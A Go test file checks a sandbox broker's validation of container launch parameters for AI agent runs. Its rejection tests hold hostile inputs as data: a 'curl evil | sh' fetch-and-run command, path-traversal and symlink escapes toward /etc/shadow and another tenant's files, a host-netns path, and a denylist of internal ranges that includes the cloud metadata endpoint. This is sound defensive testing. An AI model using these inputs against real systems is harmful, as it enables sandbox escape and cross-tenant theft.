//go:build linux

package sandbox

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/sky-ai-eng/triage-factory/internal/githooks"
	"github.com/sky-ai-eng/triage-factory/internal/paths"
)

// ensureRunTreeFixture creates the on-disk directory RunTreeRoot(conversationID)
// resolves to. The worktree/mount-scope check now requires a launch's
// Worktree to actually exist (realPath resolves symlinks, which needs the
// path to be there) — in production internal/worktree.CreateForPR /
// MakeRunRoot always materialize it before agentproc.Run ever issues the
// launch RPC, so tests that want an ACCEPTED launch must do the same.
func ensureRunTreeFixture(t *testing.T, conversationID string) string {
	t.Helper()
	dir := RunTreeRoot(conversationID)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatalf("mkdir run-tree fixture %q: %v", dir, err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(dir) })
	return dir
}

// ensureGitHooksFixture points paths.HooksDir() at a throwaway root (via
// paths.SetForTest) and creates it on disk, so TrustedGitHooksDir()'s
// existence-checked resolution succeeds without a real githooks.Ensure()
// having run.
func ensureGitHooksFixture(t *testing.T) {
	t.Helper()
	paths.SetForTest(t, t.TempDir())
	if err := os.MkdirAll(paths.HooksDir(), 0o755); err != nil {
		t.Fatalf("mkdir git-hooks fixture: %v", err)
	}
}

// ensureAgentHostSocketFixture creates a placeholder file at
// TrustedAgentHostSocketPath(conversationID) — the fixed host path
// cmd/exec/agenthost.Start binds a real unix socket to — so tests can
// exercise the existence-checked per-run socket pinning without a real
// HostDaemon running. realPath only needs the path to exist (any file
// type; it doesn't dial or care about the socket protocol), and a plain
// file — unlike net.Listen — is safe to create redundantly from Go's
// fuzzing engine's multiple worker processes, which each re-run this
// package's fuzz seed setup independently against the SAME fixed path.
//
// Redirects trustedAgentHostSocketRoot to a per-test temp dir first: the
// real root is /run/tf, which only root (or whoever the container
// entrypoint hands it to) can create — mirrors cmd/capbroker's
// brokerSocketPath test redirection for the same reason.
func ensureAgentHostSocketFixture(t *testing.T, conversationID string) string {
	t.Helper()
	orig := trustedAgentHostSocketRoot
	trustedAgentHostSocketRoot = t.TempDir()
	t.Cleanup(func() { trustedAgentHostSocketRoot = orig })

	sockPath := TrustedAgentHostSocketPath(conversationID)
	if err := os.MkdirAll(filepath.Dir(sockPath), 0o700); err != nil {
		t.Fatalf("mkdir agenthost socket dir: %v", err)
	}
	if err := os.WriteFile(sockPath, nil, 0o600); err != nil {
		t.Fatalf("create agenthost socket fixture %q: %v", sockPath, err)
	}
	t.Cleanup(func() { _ = os.Remove(sockPath) })
	return sockPath
}

// validParams returns a LaunchParams that passes ValidateLaunchParams, so
// each rejection test can mutate exactly one field and prove that field's
// gate — the boundary the broker enforces before it builds or execs
// anything from an orchestrator's request. The worktree is a package-wide
// fixed path (RunTreeRoot("run-abc123")); tests don't need per-test
// isolation on it (nothing writes into it), so it's created idempotently
// here rather than threading *testing.T through every one of this
// function's many call sites.
func validParams() LaunchParams {
	_ = os.MkdirAll(RunTreeRoot("run-abc123"), 0o755)
	return LaunchParams{
		ConversationID: "run-abc123",
		ContainerID:    "tf-abc123-1",
		Rootfs:         RootfsSelector{Name: "base"},
		Env: []EnvVar{
			{Key: "PATH", Value: "/usr/bin"},
			{Key: "ANTHROPIC_BASE_URL", Value: "http://10.42.1.1:9000"},
			{Key: "GIT_CONFIG_KEY_0", Value: "core.hooksPath"},
			{Key: "GIT_CONFIG_VALUE_0", Value: "/hooks"},
		},
		Args:     []string{TrustedToolHostBinaryDestination, toolHostServeVerb, "--connect", "/run/tf-tools/tools.sock"},
		Worktree: RunTreeRoot("run-abc123"),
		Rlimits:  []Rlimit{{Type: "RLIMIT_NOFILE", Soft: 1024, Hard: 1024}},
		// The netns name must be the one this run's id derives — the ownership
		// check binds it, not just the tf-<hex>-<idx> shape.
		NetnsPath: "/var/run/netns/" + NetnsNameForRun("run-abc123", 1),
	}
}

func TestValidateLaunchParams_AcceptsValid(t *testing.T) {
	if err := ValidateLaunchParams(validParams()); err != nil {
		t.Fatalf("ValidateLaunchParams rejected valid params: %v", err)
	}
	// The empty rootfs selector resolves to "base" and must also pass.
	p := validParams()
	p.Rootfs = RootfsSelector{}
	if err := ValidateLaunchParams(p); err != nil {
		t.Errorf("empty rootfs selector rejected: %v", err)
	}
}

// TestValidateLaunchParams_RejectsBadRootfsName is the "bad rootfs name"
// acceptance rejection: a name outside the broker's curated catalog fails.
func TestValidateLaunchParams_RejectsBadRootfsName(t *testing.T) {
	p := validParams()
	p.Rootfs = RootfsSelector{Name: "totally-not-a-variant"}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted an unknown rootfs variant; want rejection")
	}
}

// TestValidateLaunchParams_RejectsPathShapedRootfs is the "path-shaped
// param" rejection: a rootfs SELECTOR that carries path structure (a
// would-be rootfs path) is rejected before the catalog lookup, so the
// broker never mounts an orchestrator-supplied path as the root.
func TestValidateLaunchParams_RejectsPathShapedRootfs(t *testing.T) {
	for _, name := range []string{"/host/evil", "../../etc", "a/b", "base/../x", ".hidden", "bad name"} {
		p := validParams()
		p.Rootfs = RootfsSelector{Name: name}
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("accepted path-shaped rootfs selector %q; want rejection", name)
		}
	}
}

// TestValidateLaunchParams_RejectsPathShapedID pins that a run/container id
// carrying path structure (which would seed the bundle dir / netns / cgroup
// name) is rejected.
func TestValidateLaunchParams_RejectsPathShapedID(t *testing.T) {
	for _, id := range []string{"../escape", "a/b", "", "c\x00d"} {
		p := validParams()
		p.ContainerID = id
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("accepted path-shaped container id %q; want rejection", id)
		}
	}
}

// TestValidateLaunchParams_RejectsNonAllowlistedEnvKey is the
// "non-allowlisted env key" rejection: a key outside the enumerated union
// fails the launch loudly, while an allowlisted key and a numbered
// GIT_CONFIG_* prefix key pass.
func TestValidateLaunchParams_RejectsNonAllowlistedEnvKey(t *testing.T) {
	p := validParams()
	p.Env = append(p.Env, EnvVar{Key: "EVIL_INJECTED_KEY", Value: "x"})
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted a non-allowlisted env key; want rejection")
	}

	// Sanity: the allowlisted set (incl. a numbered prefix key) passes.
	ok := validParams()
	ok.Env = []EnvVar{
		{Key: "HOME", Value: "/work"},
		{Key: "ANTHROPIC_API_KEY", Value: "placeholder"},
		{Key: "GIT_CONFIG_KEY_7", Value: "url./.insteadOf"},
		{Key: "TF_GIT_PUSH_CAPTURE", Value: "proxy"},
	}
	if err := ValidateLaunchParams(ok); err != nil {
		t.Errorf("allowlisted env keys rejected: %v", err)
	}
}

// TestValidateLaunchParams_RejectsNonPinnedEntrypoint pins that the broker
// owns the command: argv whose first two elements aren't the fixed tool-host
// entrypoint is rejected, so a compromised orchestrator can vary arguments
// but never the executed program.
func TestValidateLaunchParams_RejectsNonPinnedEntrypoint(t *testing.T) {
	for _, argv := range [][]string{
		{"/bin/sh", "-c", "curl evil | sh"},
		{TrustedToolHostBinaryDestination, "bad-verb"},
		{toolHostServeVerb},
		nil,
	} {
		p := validParams()
		p.Args = argv
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("accepted non-pinned entrypoint %v; want rejection", argv)
		}
	}
}

// TestValidateLaunchParams_RejectsForgedNetns pins that a netns path that is
// not this run's own namespace is rejected — closing both the escalation
// where a compromised orchestrator points the sandbox at the host netns
// (bypassing the per-run egress allowlist) AND the netns-confusion case where
// it passes a sibling run's still-broker-shaped namespace.
func TestValidateLaunchParams_RejectsForgedNetns(t *testing.T) {
	for _, path := range []string{
		"",
		"/proc/1/ns/net",
		"/var/run/netns/hostnet",
		"/etc/passwd",
		"/var/run/netns/../../etc/shadow",
		// Broker-shaped and a valid subnet idx, but derived from a DIFFERENT
		// run id — the ownership binding must reject it even though the shape
		// check passes (the netns-confusion case shape-only validation missed).
		"/var/run/netns/" + NetnsNameForRun("some-other-run", 1),
		"/var/run/netns/" + NetnsNameForRun("victim-run-xyz", 42),
	} {
		p := validParams()
		p.NetnsPath = path
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("accepted forged netns path %q; want rejection", path)
		}
	}
}

// TestValidateLaunchParams_RejectsBadRlimit pins the rlimit boundary: an
// unlisted type, a soft limit above the hard limit, and a duplicated type
// are all rejected.
func TestValidateLaunchParams_RejectsBadRlimit(t *testing.T) {
	cases := map[string][]Rlimit{
		"unlisted type": {{Type: "RLIMIT_MEMLOCK", Soft: 1, Hard: 1}},
		"soft > hard":   {{Type: "RLIMIT_NOFILE", Soft: 2048, Hard: 1024}},
		"duplicate type": {
			{Type: "RLIMIT_NOFILE", Soft: 1024, Hard: 1024},
			{Type: "RLIMIT_NOFILE", Soft: 512, Hard: 512},
		},
	}
	for name, rl := range cases {
		p := validParams()
		p.Rlimits = rl
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("%s: accepted a bad rlimit set; want rejection", name)
		}
	}
}

// TestValidateLaunchParams_RejectsNonAbsolutePaths pins that the run-data
// paths the broker binds (worktree, mount source/destination) must be clean
// absolute paths — caught at the boundary, not late inside runsc.
func TestValidateLaunchParams_RejectsNonAbsolutePaths(t *testing.T) {
	worktree := validParams()
	worktree.Worktree = "relative/worktree"
	if err := ValidateLaunchParams(worktree); err == nil {
		t.Error("accepted a relative worktree; want rejection")
	}

	uncleanWorktree := validParams()
	uncleanWorktree.Worktree = "/data/../data/worktrees/run"
	if err := ValidateLaunchParams(uncleanWorktree); err == nil {
		t.Error("accepted a non-clean worktree; want rejection")
	}

	relSource := validParams()
	relSource.Mounts = []Mount{{Source: "rel/src", Destination: "/work/x"}}
	if err := ValidateLaunchParams(relSource); err == nil {
		t.Error("accepted a relative mount source; want rejection")
	}

	uncleanDest := validParams()
	uncleanDest.Mounts = []Mount{{Source: "/host/x", Destination: "/work/../etc/x"}}
	if err := ValidateLaunchParams(uncleanDest); err == nil {
		t.Error("accepted a non-clean mount destination; want rejection")
	}
}

// TestValidateLaunchParams_RejectsBadMountOption pins that a mount option
// outside the honored ro/rw set is rejected, so a caller can't slip a
// surprising mount flag into the broker-built spec.
func TestValidateLaunchParams_RejectsBadMountOption(t *testing.T) {
	// The mount source must ALSO be one this run legitimately owns (the
	// worktree/mount-scope check runs regardless of Options), so use this
	// run's own agenthost socket — a recognized, per-run mount shape — to
	// isolate the option check from the scope check.
	trustedSource := ensureAgentHostSocketFixture(t, "run-abc123")
	p := validParams()
	p.Mounts = []Mount{{Source: trustedSource, Destination: TrustedAgentHostSocketDestination, Options: []string{"suid"}}}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted an unsupported mount option; want rejection")
	}
	// ro/rw (and no options) are honored.
	for _, opts := range [][]string{nil, {"ro"}, {"rw"}} {
		ok := validParams()
		ok.Mounts = []Mount{{Source: trustedSource, Destination: TrustedAgentHostSocketDestination, Options: opts}}
		if err := ValidateLaunchParams(ok); err != nil {
			t.Errorf("mount options %v rejected: %v", opts, err)
		}
	}
}

// TestValidateLaunchParams_RejectsCrossOrgMountSource is acceptance case
// (a): a mount source under a DIFFERENT org's tree than the worktree is
// rejected, even though both are shape-valid, broker-created-looking
// paths — the core cross-tenant residual this ticket closes.
func TestValidateLaunchParams_RejectsCrossOrgMountSource(t *testing.T) {
	root := t.TempDir()
	paths.SetForTest(t, root)

	worktree := filepath.Join(root, "orgs", "org-a", "projects", "proj-1")
	mountSource := filepath.Join(root, "orgs", "org-b", "shared-repos", "acme", "widgets")
	if err := os.MkdirAll(worktree, 0o755); err != nil {
		t.Fatalf("mkdir worktree fixture: %v", err)
	}
	if err := os.MkdirAll(mountSource, 0o755); err != nil {
		t.Fatalf("mkdir mount source fixture: %v", err)
	}

	p := validParams()
	p.Worktree = worktree
	p.Mounts = []Mount{{
		Source:      mountSource,
		Destination: "/work/repos/acme/widgets",
		Options:     []string{"ro"},
	}}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted a mount source under a different org's tree than the worktree; want rejection")
	}
}

// TestValidateLaunchParams_AcceptsSameOrgMountSource is the positive half
// of the same case: a mount source under the SAME org as the worktree
// (a shared read-only repo mount under the org-scoped tree) is accepted.
func TestValidateLaunchParams_AcceptsSameOrgMountSource(t *testing.T) {
	root := t.TempDir()
	paths.SetForTest(t, root)

	worktree := filepath.Join(root, "orgs", "org-a", "projects", "proj-1")
	mountSource := filepath.Join(root, "orgs", "org-a", "shared-repos", "acme", "widgets")
	if err := os.MkdirAll(worktree, 0o755); err != nil {
		t.Fatalf("mkdir worktree fixture: %v", err)
	}
	if err := os.MkdirAll(mountSource, 0o755); err != nil {
		t.Fatalf("mkdir mount source fixture: %v", err)
	}

	p := validParams()
	p.Worktree = worktree
	p.Mounts = []Mount{{
		Source:      mountSource,
		Destination: "/work/repos/acme/widgets",
		Options:     []string{"ro"},
	}}
	if err := ValidateLaunchParams(p); err != nil {
		t.Errorf("rejected a mount source under the SAME org as the worktree: %v", err)
	}
}

// TestValidateLaunchParams_RejectsSymlinkedMountSourceEscape pins the
// symlink-resolution half of case (a): a mount source that is LEXICALLY
// under the worktree's own org tree, but is (or transits) a symlink whose
// REAL target is another org's tree, must still be rejected. Org A
// legitimately owns and writes its own shared-repos subtree, so it can
// plant this symlink itself — a purely lexical filepath.Rel check would
// have waved it through; realPath's resolution is what closes it.
func TestValidateLaunchParams_RejectsSymlinkedMountSourceEscape(t *testing.T) {
	root := t.TempDir()
	paths.SetForTest(t, root)

	worktree := filepath.Join(root, "orgs", "org-a", "projects", "proj-1")
	orgBSecret := filepath.Join(root, "orgs", "org-b", "shared-repos", "acme", "widgets")
	if err := os.MkdirAll(worktree, 0o755); err != nil {
		t.Fatalf("mkdir worktree fixture: %v", err)
	}
	if err := os.MkdirAll(orgBSecret, 0o755); err != nil {
		t.Fatalf("mkdir org-b secret fixture: %v", err)
	}
	// A symlink living INSIDE org A's own shared-repos tree — lexically
	// under org A's prefix — whose real target is org B's data.
	symlinkSource := filepath.Join(root, "orgs", "org-a", "shared-repos", "acme", "widgets")
	if err := os.MkdirAll(filepath.Dir(symlinkSource), 0o755); err != nil {
		t.Fatalf("mkdir symlink parent: %v", err)
	}
	if err := os.Symlink(orgBSecret, symlinkSource); err != nil {
		t.Fatalf("symlink: %v", err)
	}

	p := validParams()
	p.Worktree = worktree
	p.Mounts = []Mount{{
		Source:      symlinkSource,
		Destination: "/work/repos/acme/widgets",
		Options:     []string{"ro"},
	}}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted a mount source that lexically matched org A but resolved into org B via a symlink; want rejection")
	}
}

// TestValidateLaunchParams_RejectsSymlinkedWorktreeEscape is the same
// resolution requirement applied to the worktree itself: a worktree path
// that is lexically under the state-root org tree but is (or transits) a
// symlink whose real target is OUTSIDE that tree entirely must be
// rejected, not silently accepted because the claimed path looked
// in-scope. (A worktree that resolves into a DIFFERENT but genuine org
// subtree is not a bypass — per worktreeScope's documented ceiling, that
// just makes the run scoped as that org outright, which the orchestrator
// could always do directly. The violation this guards is escaping the org
// tree's shape altogether.)
func TestValidateLaunchParams_RejectsSymlinkedWorktreeEscape(t *testing.T) {
	root := t.TempDir()
	paths.SetForTest(t, root)

	orgAProjects := filepath.Join(root, "orgs", "org-a", "projects")
	if err := os.MkdirAll(orgAProjects, 0o755); err != nil {
		t.Fatalf("mkdir org-a projects fixture: %v", err)
	}
	// A symlink at what looks like org A's project dir, really pointing
	// outside the org tree altogether.
	symlinkedWorktree := filepath.Join(orgAProjects, "proj-1")
	if err := os.Symlink("/etc", symlinkedWorktree); err != nil {
		t.Fatalf("symlink: %v", err)
	}

	p := validParams()
	p.Worktree = symlinkedWorktree
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted a worktree that lexically matched org A but resolved outside the org tree via a symlink; want rejection")
	}
}

// TestValidateLaunchParams_RejectsWorktreeOutsideOrgTree is acceptance
// case (c): a worktree that is neither this run's own ephemeral tree nor
// under the state-root org tree (e.g. /etc) is rejected outright.
func TestValidateLaunchParams_RejectsWorktreeOutsideOrgTree(t *testing.T) {
	root := t.TempDir()
	paths.SetForTest(t, root)
	orgsRoot := filepath.Join(root, "orgs")
	if err := os.MkdirAll(orgsRoot, 0o755); err != nil {
		t.Fatalf("mkdir orgs-root fixture: %v", err)
	}

	for _, wt := range []string{"/etc", "/etc/passwd", orgsRoot} {
		p := validParams()
		p.Worktree = wt
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("accepted worktree %q outside both legitimate shapes; want rejection", wt)
		}
	}
}

// TestValidateLaunchParams_RejectsForeignGlobalMountSource is acceptance
// case (b): a caller-supplied source for the TF-binary / git-hooks
// destinations that does not match the broker's own resolution is
// rejected — these two destinations are broker-resolved, never
// caller-trusted, mirroring TrustedGitHooksDir.
func TestValidateLaunchParams_RejectsForeignGlobalMountSource(t *testing.T) {
	attackerWrapper := filepath.Join(t.TempDir(), "attacker-wrapper")
	if err := os.WriteFile(attackerWrapper, []byte("evil"), 0o644); err != nil {
		t.Fatalf("write attacker-wrapper fixture: %v", err)
	}
	p := validParams()
	p.Mounts = []Mount{{Source: attackerWrapper, Destination: TrustedTFBinaryDestination, Options: []string{"ro"}}}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted a foreign source for the TF-binary destination; want rejection")
	}

	attackerHooks := filepath.Join(t.TempDir(), "attacker-hooks")
	if err := os.MkdirAll(attackerHooks, 0o755); err != nil {
		t.Fatalf("mkdir attacker-hooks fixture: %v", err)
	}
	p = validParams()
	p.Mounts = []Mount{{Source: attackerHooks, Destination: githooks.SandboxDir, Options: []string{"ro"}}}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted a foreign source for the git-hooks destination; want rejection")
	}

	// The genuinely trusted sources pass.
	ensureGitHooksFixture(t)
	tfBin, err := TrustedTFBinaryPath()
	if err != nil {
		t.Fatalf("resolve trusted TF binary path: %v", err)
	}
	ok := validParams()
	ok.Mounts = []Mount{
		{Source: tfBin, Destination: TrustedTFBinaryDestination, Options: []string{"ro"}},
		{Source: TrustedGitHooksDir(), Destination: githooks.SandboxDir, Options: []string{"ro"}},
	}
	if err := ValidateLaunchParams(ok); err != nil {
		t.Errorf("rejected the genuinely trusted global mount sources: %v", err)
	}
}

// TestValidateLaunchParams_RejectsForeignAgentHostSocket is acceptance case
// (e)'s negative half: an agenthost-socket mount whose source names a
// DIFFERENT run (a sibling's, still broker-shaped) is rejected.
func TestValidateLaunchParams_RejectsForeignAgentHostSocket(t *testing.T) {
	siblingSocket := ensureAgentHostSocketFixture(t, "some-other-run")
	p := validParams()
	p.Mounts = []Mount{{
		Source:      siblingSocket,
		Destination: TrustedAgentHostSocketDestination,
	}}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted a sibling run's agenthost socket; want rejection")
	}
}

// TestValidateLaunchParams_AcceptsRealisticMountSet is acceptance case (d):
// the actual mount set a normal delegated run assembles (TF binary,
// git-hooks, the run's own agenthost socket — mirroring
// internal/agentproc's extraMounts assembly, no shared read-only repo
// mounts) against the ephemeral worktree shape is accepted unchanged.
func TestValidateLaunchParams_AcceptsRealisticMountSet(t *testing.T) {
	ensureGitHooksFixture(t)
	tfBin, err := TrustedTFBinaryPath()
	if err != nil {
		t.Fatalf("resolve trusted TF binary path: %v", err)
	}
	p := validParams()
	agentSocket := ensureAgentHostSocketFixture(t, p.ConversationID)
	p.Mounts = []Mount{
		{Source: tfBin, Destination: TrustedTFBinaryDestination, Options: []string{"ro"}},
		{Source: TrustedGitHooksDir(), Destination: githooks.SandboxDir, Options: []string{"ro"}},
		{Source: agentSocket, Destination: TrustedAgentHostSocketDestination},
	}
	if err := ValidateLaunchParams(p); err != nil {
		t.Errorf("rejected a normal run's real mount set: %v", err)
	}
}

// TestValidateLaunchParams_RejectsMalformedEnvEntry pins the env-entry
// boundary beyond the allowlist: an empty key, a key carrying '=' or NUL,
// and a value carrying NUL are all rejected so the broker never folds a
// misparsing entry into the spec.
func TestValidateLaunchParams_RejectsMalformedEnvEntry(t *testing.T) {
	cases := map[string]EnvVar{
		"empty key":   {Key: "", Value: "x"},
		"key has =":   {Key: "HO=ME", Value: "x"},
		"key has NUL": {Key: "HO\x00ME", Value: "x"},
		"value NUL":   {Key: "HOME", Value: "a\x00b"},
	}
	for name, e := range cases {
		p := validParams()
		p.Env = append(p.Env, e)
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("%s: accepted a malformed env entry; want rejection", name)
		}
	}
}

// TestValidateEgressCIDR_DenylistsInternal is the "denylisted CIDR"
// acceptance rejection: the cloud metadata endpoint, the control-plane
// subnet, private/link-local ranges, and the sandbox subnet pool are all
// rejected — "validated" means *safe*, not merely well-formed. A public
// destination passes the denylist (application of an accepted CIDR is the
// self-host raw-L3 variant, tracked separately).
func TestValidateEgressCIDR_DenylistsInternal(t *testing.T) {
	denied := []struct {
		name string
		cidr string
	}{
		{"cloud metadata endpoint", "169.254.169.254"},
		{"cloud metadata range", "169.254.169.254/32"},
		{"link-local", "169.254.0.0/16"},
		{"control-plane subnet (private 10/8)", "10.0.5.0/24"},
		{"sandbox subnet pool", "10.42.7.0/24"},
		{"rfc1918 172.16/12", "172.16.30.0/24"},
		{"rfc1918 192.168/16", "192.168.1.0/24"},
		{"loopback", "127.0.0.1/32"},
		{"straddles denylist", "10.0.0.0/7"},
	}
	for _, d := range denied {
		if err := validateEgressCIDR(d.cidr); err == nil {
			t.Errorf("%s: validateEgressCIDR(%q) = nil; want rejection", d.name, d.cidr)
		}
	}

	// Empty means "no extra egress" and is a no-op, not an error.
	if err := validateEgressCIDR(""); err != nil {
		t.Errorf("empty CIDR rejected: %v", err)
	}
	// A public destination is not on the internal denylist.
	for _, ok := range []string{"203.0.113.0/24", "8.8.8.8/32"} {
		if err := validateEgressCIDR(ok); err != nil {
			t.Errorf("public CIDR %q rejected by the internal denylist: %v", ok, err)
		}
	}
	// Malformed input is rejected too.
	if err := validateEgressCIDR("not-a-cidr"); err == nil {
		t.Error("accepted a malformed CIDR; want rejection")
	}
}

// TestValidateLaunchParams_DenylistedCIDRRejected pins the same denylist at
// the whole-params boundary (the path the broker actually calls), including
// the two the acceptance names explicitly.
func TestValidateLaunchParams_DenylistedCIDRRejected(t *testing.T) {
	for _, cidr := range []string{"169.254.169.254/32", "10.0.0.0/8"} {
		p := validParams()
		p.ExtraEgressCIDR = cidr
		err := ValidateLaunchParams(p)
		if err == nil {
			t.Errorf("ValidateLaunchParams accepted denylisted egress CIDR %q", cidr)
			continue
		}
		if !strings.Contains(err.Error(), "denylist") {
			t.Errorf("egress CIDR %q rejected but not for the denylist reason: %v", cidr, err)
		}
	}
}

// validSidecarParams returns a SidecarLaunchParams that passes
// ValidateSidecarLaunchParams, mirroring validParams' role for the run
// launch's own boundary tests.
func validSidecarParams() SidecarLaunchParams {
	return SidecarLaunchParams{
		ContainerID: "tf-abc123-1-sc",
		UID:         SidecarUIDBase,
		GID:         SidecarUIDBase,
	}
}

func TestValidateSidecarLaunchParams_AcceptsValid(t *testing.T) {
	if err := ValidateSidecarLaunchParams(validSidecarParams()); err != nil {
		t.Fatalf("ValidateSidecarLaunchParams rejected valid params: %v", err)
	}
	// The top of the band (SidecarUIDBase + MaxSandboxes - 1) must also pass,
	// with the subnet index it derives from.
	p := validSidecarParams()
	p.SubnetIdx = MaxSandboxes - 1
	p.UID, p.GID = SidecarUID(p.SubnetIdx), SidecarUID(p.SubnetIdx)
	if err := ValidateSidecarLaunchParams(p); err != nil {
		t.Errorf("top-of-band uid rejected: %v", err)
	}
}

// TestValidateSidecarLaunchParams_RejectsUIDSubnetMismatch pins the tie between
// the uid the broker execs at and the subnet index it binds the run's
// shared-origin listener against. Without it a caller could take one run's
// sidecar slot while pointing the bind at a sibling's veth IP.
func TestValidateSidecarLaunchParams_RejectsUIDSubnetMismatch(t *testing.T) {
	p := validSidecarParams()
	p.SubnetIdx = 7
	p.UID, p.GID = SidecarUID(3), SidecarUID(3)
	if err := ValidateSidecarLaunchParams(p); err == nil {
		t.Error("ValidateSidecarLaunchParams accepted a uid derived from a different subnet index than the one it binds against")
	}
}

// TestValidateSidecarLaunchParams_RejectsUIDOutsideBand is the load-bearing
// security check: a compromised orchestrator asking the broker to setuid
// the sidecar to root, to the orchestrator's own uid, or to anything else
// outside the reserved range must be refused before any exec happens.
func TestValidateSidecarLaunchParams_RejectsUIDOutsideBand(t *testing.T) {
	for _, uid := range []int{0, 1, WorktreeUID, 10001, SidecarUIDBase - 1, SidecarUIDBase + MaxSandboxes} {
		p := validSidecarParams()
		p.UID, p.GID = uid, uid
		if err := ValidateSidecarLaunchParams(p); err == nil {
			t.Errorf("ValidateSidecarLaunchParams accepted uid %d, outside the reserved band", uid)
		}
	}
}

func TestValidateSidecarLaunchParams_RejectsMismatchedUIDGID(t *testing.T) {
	p := validSidecarParams()
	p.GID = p.UID + 1
	if err := ValidateSidecarLaunchParams(p); err == nil {
		t.Error("ValidateSidecarLaunchParams accepted mismatched uid/gid")
	}
}

func TestValidateSidecarLaunchParams_RejectsPathShapedContainerID(t *testing.T) {
	p := validSidecarParams()
	p.ContainerID = "../etc/passwd"
	if err := ValidateSidecarLaunchParams(p); err == nil {
		t.Error("ValidateSidecarLaunchParams accepted a path-shaped container id")
	}
}

// TestValidateSidecarLaunchParams_RejectsMissingSuffix pins the check that
// keeps a sidecar's registry key from ever colliding with a run's own in
// the broker's shared s.runs map — a run's ContainerID never carries
// SidecarContainerIDSuffix (see wrap()'s "tf-<frag>-<idx>" naming), so
// requiring it here at the boundary (not just upheld by the Linux
// dispatcher's own naming convention) makes that collision structurally
// impossible.
func TestValidateSidecarLaunchParams_RejectsMissingSuffix(t *testing.T) {
	p := validSidecarParams()
	p.ContainerID = "tf-abc123-1" // a run's own container id shape, no suffix
	if err := ValidateSidecarLaunchParams(p); err == nil {
		t.Error("ValidateSidecarLaunchParams accepted a container id missing the sidecar suffix")
	}
}
